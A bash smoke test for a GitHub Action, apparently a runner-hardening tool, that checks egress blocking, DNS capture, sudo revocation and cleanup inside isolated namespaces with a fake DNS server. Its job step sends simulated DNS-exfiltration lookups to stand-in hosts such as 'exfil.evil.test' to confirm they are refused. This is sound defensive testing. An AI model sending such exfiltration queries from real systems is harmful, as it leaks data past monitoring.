#!/usr/bin/env bash
# Run the action the way a GitHub-hosted runner does, locally and safely:
# as a non-root user with passwordless sudo (and Ubuntu's `Defaults use_pty`),
# under a parent process named Runner.Worker, in a private network and mount
# namespace with a fake upstream DNS server. Nothing touches the host's real
# network, resolv.conf or sudoers.
#
#   sudo scripts/action-smoke.sh            # needs root, unshare, python3, node
#
# It checks block mode with DNS capture and disable-sudo end to end: the job
# user loses sudo, cannot read the evidence, DNS off the allowlist is REFUSED
# even when asked of an outside resolver, the post step reports it, and when
# Runner.Worker exits the warden removes every rule and the sudo revocation.
set -euo pipefail
[ "$(id -u)" -eq 0 ] || { echo "run as root" >&2; exit 2; }
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
USER_NAME="${SMOKE_USER:-legion-smoke}"
id "$USER_NAME" >/dev/null 2>&1 || useradd -m -s /bin/bash "$USER_NAME"

exec unshare --net --mount --propagation private bash -s -- "$ROOT" "$USER_NAME" <<'INNER'
set -euo pipefail
ROOT="$1"; U="$2"
W="$(mktemp -d)"; chmod 0755 "$W"   # job files, owned by the job user
M="$(mktemp -d)"                     # bind-mount sources, root-owned (sudo checks)
pass() { printf '  ok   %s\n' "$*"; }
fail() { printf '  FAIL %s\n' "$*"; FAILED=1; }
FAILED=0

# Private copies of what the action edits.
# /run first: on Ubuntu runners /etc/resolv.conf is a symlink into /run, so a
# bind made through it before replacing /run would be hidden again.
mkdir -p "$M/run"; chmod 0755 "$M/run"; mount --bind "$M/run" /run
printf 'nameserver 127.0.0.2\n' > "$M/resolv.conf"
RESOLV="$(readlink -m /etc/resolv.conf)"   # -m: the target may not exist yet
mkdir -p "$(dirname "$RESOLV")"; [ -e "$RESOLV" ] || : > "$RESOLV"
mount --bind "$M/resolv.conf" "$RESOLV"
cp /etc/nsswitch.conf "$M/nsswitch.conf"; mount --bind "$M/nsswitch.conf" /etc/nsswitch.conf
mkdir -p "$M/sudoers.d"; chmod 0750 "$M/sudoers.d"
printf 'Defaults use_pty\n%s ALL=(ALL) NOPASSWD:ALL\n' "$U" > "$M/sudoers.d/$U"; chmod 0440 "$M/sudoers.d/$U"
mount --bind "$M/sudoers.d" /etc/sudoers.d

# Loopback up, default route via lo, fake upstream answering 192.0.2.10.
python3 - <<'PY'
import socket, struct, fcntl
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
flags = struct.unpack('16sH', fcntl.ioctl(s, 0x8913, struct.pack('16sH', b'lo', 0)))[1]
fcntl.ioctl(s, 0x8914, struct.pack('16sH', b'lo', flags | 1))
# SIOCADDRT: default route via lo so packets to outside resolvers are routable.
dev = b'lo\0'
import ctypes
buf = ctypes.create_string_buffer(dev)
rtentry = bytearray(120)
struct.pack_into('HH4s8x', rtentry, 8, socket.AF_INET, 0, socket.inet_aton('0.0.0.0'))   # dst
struct.pack_into('HH4s8x', rtentry, 24, socket.AF_INET, 0, socket.inet_aton('0.0.0.0'))  # gateway
struct.pack_into('HH4s8x', rtentry, 40, socket.AF_INET, 0, socket.inet_aton('0.0.0.0'))  # genmask
struct.pack_into('H', rtentry, 56, 0x0001)                                               # RTF_UP
struct.pack_into('P', rtentry, 88, ctypes.addressof(buf))                                # rt_dev (x86-64 layout)
fcntl.ioctl(s, 0x890B, bytes(rtentry))
PY
python3 - <<'PY' &
import socket, struct
up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); up.bind(('127.0.0.2', 53))
while True:
    m, a = up.recvfrom(512)
    ans = m[:2] + struct.pack('>HHHHH', 0x8180, 1, 1, 0, 0) + m[12:] + b'\xc0\x0c' + struct.pack('>HHIH', 1, 1, 60, 4) + bytes([192, 0, 2, 10])
    up.sendto(ans, a)
PY
UPSTREAM=$!
# Wait until the fake upstream answers (a slow CI runner may need more than a
# fixed sleep), and say so if it never does.
python3 - <<'PY' || { echo "fake upstream on 127.0.0.2:53 never answered"; exit 1; }
import socket, struct, time, sys
q = struct.pack('>HHHHHH', 7, 0x0100, 1, 0, 0, 0) + b'\x07example\x03com\x00\x00\x01\x00\x01'
for _ in range(50):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(0.2)
    try:
        s.sendto(q, ('127.0.0.2', 53)); s.recv(512); print("  fake upstream answering"); sys.exit(0)
    except Exception:
        time.sleep(0.1)
sys.exit(1)
PY

# Leftovers under the action's old fixed /tmp names, owned by someone else, as
# an earlier step or another user leaves them on a real runner. The action must
# not depend on writing any fixed path in the shared /tmp.
for f in resolv.legion nsswitch.legion legion-resolved.conf legion-no-sudo; do
    rm -rf "/tmp/$f"; printf 'planted\n' > "/tmp/$f"; chmod 0600 "/tmp/$f"
done

# The job user must be able to read the action (a CI checkout under
# /home/runner is not readable by other users), so run a copy.
mkdir -p "$W/repo"
cp -a "$ROOT/action" "$W/repo/action"
[ -d "$ROOT/.legion" ] && cp -a "$ROOT/.legion" "$W/repo/.legion"
ROOT="$W/repo"

# A parent named Runner.Worker, so the action finds it and starts the warden.
cp /bin/bash "$W/Runner.Worker"
cat > "$W/job.sh" <<JOB
set -u
cd "$ROOT"
export GITHUB_STATE="$W/state.env" GITHUB_STEP_SUMMARY="$W/summary.md" GITHUB_WORKSPACE="$ROOT"
: > "\$GITHUB_STATE"
env 'INPUT_EGRESS-POLICY=block' 'INPUT_ALLOWED-ENDPOINTS=example.com' 'INPUT_DNS-CAPTURE=true' \
    'INPUT_EBPF=off' 'INPUT_FILE-INTEGRITY=off' 'INPUT_DISABLE-SUDO=true' 'INPUT_LEARNED-BASELINE=false' \
    node action/index.js > "$W/main.log" 2>&1
echo main-exit=\$? >> "$W/main.log"
# Job steps, as the job user.
{ sudo -n true 2>/dev/null && echo SUDO=works || echo SUDO=revoked
  cat /run/legion/state.json >/dev/null 2>&1 && echo EVIDENCE=readable || echo EVIDENCE=hidden
  python3 - <<'PY'
import socket, struct, random
def q(server, name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
    hdr = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
    body = b''.join(bytes([len(l)]) + l.encode() for l in name.split('.')) + b'\x00\x00\x01\x00\x01'
    s.sendto(hdr + body, (server, 53))
    try:
        r = s.recv(512); return struct.unpack('>H', r[2:4])[0] & 0xf
    except Exception as e:
        return 'timeout'
print('EVIL_VIA_1111=%s' % q('1.1.1.1', 'exfil.evil.test'))
print('EVIL_VIA_STUB=%s' % q('127.0.0.1', 'exfil2.evil.test'))
print('ALLOWED_VIA_1111=%s' % q('1.1.1.1', 'www.example.com'))
PY
} > "$W/steps.log" 2>&1
STATE_sudo="\$(sed -n 's/^sudo=//p' "\$GITHUB_STATE")" STATE_isPost=true node action/index.js > "$W/post.log" 2>&1
JOB
chmod 0644 "$W/job.sh"
chown -R "$U" "$W"
su "$U" -c "'$W/Runner.Worker' '$W/job.sh'"
sleep 3   # Runner.Worker has exited: give the warden its 1s poll and teardown

echo "== namespace"; printf '   resolv.conf: %s\n' "$(tr '\n' ' ' < /etc/resolv.conf)"; ss -lunp 2>/dev/null | grep ':53 ' | sed 's/^/   /' || true
echo "== main";    grep -E 'Legion|evidence|enforced|DNS|sudo|error|main-exit' "$W/main.log" | sed 's/^/   /'
echo "== steps";   sed 's/^/   /' "$W/steps.log"
echo "== checks"
grep -q '^main-exit=0' "$W/main.log" && ! grep -q '::error::' "$W/main.log" && pass "main step succeeded" || fail "main step failed"
grep -q 'SUDO=revoked' "$W/steps.log" && pass "job user lost sudo" || fail "job user kept sudo"
grep -q 'EVIDENCE=hidden' "$W/steps.log" && pass "evidence unreadable to the job" || fail "evidence readable"
grep -q 'EVIL_VIA_1111=5' "$W/steps.log" && pass "unlisted name REFUSED via 1.1.1.1 (redirected)" || fail "unlisted name not refused via 1.1.1.1"
grep -q 'EVIL_VIA_STUB=5' "$W/steps.log" && pass "unlisted name REFUSED via the forwarder" || fail "unlisted name not refused locally"
grep -q 'ALLOWED_VIA_1111=0' "$W/steps.log" && pass "allowlisted name answered" || fail "allowlisted name not answered"
grep -q 'revoked for job steps' "$W/summary.md" && pass "summary says sudo was revoked" || fail "summary missing the sudo line"
grep -q 'exfil.evil.test' "$W/summary.md" && pass "summary lists the refused lookup" || fail "summary missing refused lookups"
if iptables-save | grep -q LEGION || ip6tables-save | grep -q LEGION; then fail "rules left after Runner.Worker exited"; else pass "warden removed every rule"; fi
[ ! -e /etc/sudoers.d/zz-legion-disable-sudo ] && pass "warden removed the sudo revocation" || fail "sudo revocation left behind"
kill "$UPSTREAM" 2>/dev/null || true
[ "$FAILED" -eq 0 ] && echo "action smoke passed" || { echo "--- main.log"; cat "$W/main.log"; echo "--- post.log"; cat "$W/post.log"; exit 1; }
INNER
